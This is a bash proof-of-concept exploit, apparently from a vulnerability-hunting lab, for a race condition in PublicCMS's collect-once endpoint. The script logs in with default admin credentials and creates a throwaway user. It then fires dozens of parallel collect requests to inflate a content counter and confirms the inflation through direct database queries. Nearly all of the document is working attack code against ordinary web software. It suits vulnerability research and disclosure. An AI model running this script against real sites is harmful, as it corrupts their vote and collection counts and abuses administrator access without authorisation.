#!/usr/bin/env bash
# VULN-012 — Redemption race in "collect/vote/score once" -> counter stuffing (TOCTOU)
#
# collection/collect (and vote/score) read the per-user marker, then increment a counter and insert
# the marker in SEPARATE transactions, with no row lock / atomic conditional / per-user throttle on
# the logged-in path. K concurrent requests all read a null marker and all commit their increment;
# the unique marker PK only prevents duplicate marker ROWS. Net: one account inflates the counter
# by up to K while owning exactly one marker.
#
# Proof: as ONE fresh user, fire K parallel collect requests for one content item; compare the
# content.collections delta (should be 1) to the cms_user_collection marker count (is 1).
#
# CONFIRMED when collections delta > 1 while the user has exactly 1 collection marker.
#
# DESTRUCTIVE (inflates a counter). Fresh user per run.
set -u
BASE_URL="${BASE_URL:-http://localhost:20000}"
VHOST="${VHOST:-site2.dev.publiccms.com}"
ADMIN_USER="${ADMIN_USER:-admin}"; ADMIN_PASS="${ADMIN_PASS:-admin}"
CONTENT_ID="${CONTENT_ID:-1}"; K="${K:-40}"
MYSQL_CONTAINER="${MYSQL_CONTAINER:-cvehunt_PublicCMS_mysql}"
DBQ(){ docker exec "$MYSQL_CONTAINER" mysql -uroot -pRootPass2026 publiccms -N -e "$1" 2>/dev/null | tr -d '\r'; }
OUT="$(cd "$(dirname "$0")" && pwd)"
S="$(tr -dc 'a-z0-9' </dev/urandom | head -c 8)"

echo "[INFO] VULN-012: redemption race (collect-once) -> counter stuffing"

AC=$(curl -s -D - -o /dev/null -H "Host: $VHOST" --data "username=${ADMIN_USER}&password=${ADMIN_PASS}" \
     "$BASE_URL/admin/login" | grep -i 'set-cookie: PUBLICCMS_ADMIN' | cut -d= -f2 | cut -d';' -f1); ACSRF="${AC#*_}"
[ -z "$AC" ] && { echo "[FAIL] no admin session"; exit 1; }
curl -s -o /dev/null -H "Host: $VHOST" -b "PUBLICCMS_ADMIN=$AC" --data-urlencode "_csrf=$ACSRF" \
  --data-urlencode "name=racer_$S" --data-urlencode "nickname=racer_$S" --data-urlencode "password=Passw0rd!23" \
  --data-urlencode "repassword=Passw0rd!23" --data-urlencode "contentPermissions=0" "$BASE_URL/admin/sysUser/save"
RACER=$(DBQ "SELECT id FROM sys_user WHERE name='racer_$S';")
UC=$(curl -s -D - -o /dev/null -H "Host: $VHOST" --data-urlencode "username=racer_$S" --data-urlencode "password=Passw0rd!23" \
     --data-urlencode "returnUrl=/" "$BASE_URL/doLogin" | grep -i 'set-cookie: PUBLICCMS_USER' | cut -d= -f2 | cut -d';' -f1); UCSRF="${UC#*_}"
[ -z "$UC" ] && { echo "[FAIL] racer login failed"; exit 1; }

BEFORE=$(DBQ "SELECT collections FROM cms_content WHERE id=$CONTENT_ID;")
echo "[SETUP] racer id=$RACER; content.collections BEFORE=$BEFORE; firing $K parallel collects"
for i in $(seq 1 "$K"); do
  curl -s -o /dev/null -H "Host: $VHOST" -b "PUBLICCMS_USER=$UC" \
    --data-urlencode "_csrf=$UCSRF" --data-urlencode "contentId=$CONTENT_ID" "$BASE_URL/collection/collect" &
done
wait
sleep 2
AFTER=$(DBQ "SELECT collections FROM cms_content WHERE id=$CONTENT_ID;")
MARKERS=$(DBQ "SELECT COUNT(*) FROM cms_user_collection WHERE user_id=$RACER AND content_id=$CONTENT_ID;")
DELTA=$((AFTER-BEFORE))
{ echo "content.collections before=$BEFORE after=$AFTER delta=$DELTA"; echo "racer markers=$MARKERS (unique PK -> should be 1)"; } > "$OUT/response.txt"
echo "[INFO] collections delta=$DELTA ; racer collection markers=$MARKERS"

if [ "$DELTA" -gt 1 ] && [ "$MARKERS" -eq 1 ]; then
  echo "[OK] exploit confirmed — one user inflated the counter by $DELTA while owning 1 marker (should be +1)"
  exit 0
else
  echo "[FAIL] no counter inflation (delta=$DELTA markers=$MARKERS) — race not observed this run; retry with higher K"
  exit 1
fi
# cleanup hint: DELETE FROM cms_user_collection WHERE user_id=<racer>; UPDATE cms_content SET collections=<before> WHERE id=<cid>;
